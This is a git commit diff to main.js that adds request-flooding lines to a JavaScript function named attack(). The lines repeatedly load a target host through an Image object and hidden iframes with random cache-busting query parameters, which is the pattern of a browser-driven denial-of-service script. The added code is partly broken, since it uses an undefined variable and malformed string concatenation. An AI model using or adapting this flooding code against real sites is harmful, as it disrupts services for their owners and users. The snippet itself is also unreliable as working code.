9c67009828292522329d570058cc644d80132cb1
krishpranav <krisna.pranav@gmail.com>
2021-04-22 09:31:38 +0530

    document function

--- main.js
+++ main.js
@@ -8,5 +8,9 @@ function attack() {
     var pic = new Image();
     var rand1 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
     var rand2 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
-    
+    pic.src = 'http://'+target+"/?r="+rand;
+
+    document.body.innerHTML+='<iframe src='+target+'?daKillaOfZeeCache="'+rand1+ +' &msg= '+ msg + '"style="display:none;"></iframe>';
+
+                
 }
